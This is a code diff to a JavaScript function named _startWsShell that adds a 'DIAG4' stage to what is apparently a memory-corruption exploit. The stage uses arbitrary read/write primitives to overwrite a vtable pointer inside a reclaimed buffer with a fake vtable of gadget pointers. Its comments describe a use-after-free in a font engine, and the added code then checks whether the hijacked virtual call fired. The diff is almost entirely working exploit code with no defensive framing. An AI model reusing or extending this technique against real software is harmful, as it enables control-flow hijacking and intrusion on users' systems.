@@ -6243,7 +6243,34 @@ function _startWsShell(){
           var isDiag=(msg.diag&&msg.diag!=='');
           var isDiag2=(msg.diag==='2');
           var isDiag3=(msg.diag==='3');
-          if(isDiag3){
+          var isDiag4=(msg.diag==='4');
+          if(isDiag4){
+            /* DIAG4: THE BUCKET CLIENT (the boot's own analysis line:
+             * 'client at self+0xB8 so base block at client-0x20=self+0x98
+             * sits on the bucket' - the ENGINE'S client object lives
+             * INSIDE the reclaimed buffer at MBUF+0x98, its vtable pointer
+             * at [MBUF+0x98]; the engine dispatches fontStateChanged/
+             * fontPropertyChanged on THIS - RDI = MBUF+0xB8 (the this-
+             * adjusted client) - thr_self writes the tid AT [MBUF+0xB8].
+             * DIAG2 (MBUF+0/+0x20) never touched it - consistent with
+             * the null. DIAG3's FO result: the rename RE-INITIALIZED the
+             * face at FO (ctor rewrote [FO+0]=VP, [FO+0x20]=0 - possibly
+             * wiping dispatch evidence). DIAG4: ALL slots=thr_self, the
+             * swap = [MBUF+0x98], readback = [MBUF+0x98] AND [MBUF+0xB8]. */
+            for(var dI4=0;dI4<8;dI4++)S.absWrite(FAKEVT+BigInt(dI4*8),lkF+0x2C0n);
+            FB2('D4 DIAG4: all slots=thr_self; the swap = [MBUF+0x98] (the bucket client vtable)');
+          }
+          if(isDiag4){
+            var c98Now=S.absRead(MBUF+0x98n,8)[0];
+            var cB8Now=S.absRead(MBUF+0xB8n,8)[0];
+            FB2('D4 [MBUF+0x98]=0x'+c98Now.toString(16)+' [MBUF+0xB8]=0x'+cB8Now.toString(16)+' (FAKEVT=0x'+FAKEVT.toString(16)+')');
+            reply.C98now='0x'+c98Now.toString(16);
+            reply.CB8now='0x'+cB8Now.toString(16);
+            if(cB8Now<0x100000n&&cB8Now>0n){FB2('D4 *** [MBUF+0xB8] = tid '+cB8Now.toString(10)+' - THE CLIENT DISPATCH FIRED ***');reply.dispatchProven=true;reply.tidWitness=Number(cB8Now);}
+            if(c98Now!==FAKEVT&&c98Now<0x10000000000n){FB2('D4 [MBUF+0x98] changed - 0x'+c98Now.toString(16));}
+            S.absWrite(MBUF+0x98n,c98Pre);
+            FB2('D4 client vtable restored (0x'+c98Pre.toString(16)+')');
+          } else if(isDiag3){
             /* DIAG3: FO (the LIVE object - the walk's FO, whose vtable=VP)
              * + ALL FAKEVT slots = thr_self + BOTH vtables swapped
              * (FO+0x00 primary AND FO+0x20 the secondary Client).
@@ -6304,7 +6331,12 @@ function _startWsShell(){
            * else FO+0x00 */
           var mb0Pre=0n,mb20Pre=0n;
           var fo20Pre=0n;
-          if(isDiag3){
+          var c98Pre=0n;
+          if(isDiag4){
+            c98Pre=S.absRead(MBUF+0x98n,8)[0];
+            S.absWrite(MBUF+0x98n,FAKEVT);
+            FB2('6 SWAPPED [MBUF+0x98] (was 0x'+c98Pre.toString(16)+') -> FAKEVT(all-thr_self)');
+          } else if(isDiag3){
             fo20Pre=S.absRead(FO+0x20n,8)[0];
             S.absWrite(FO,FAKEVT);
             S.absWrite(FO+0x20n,FAKEVT);
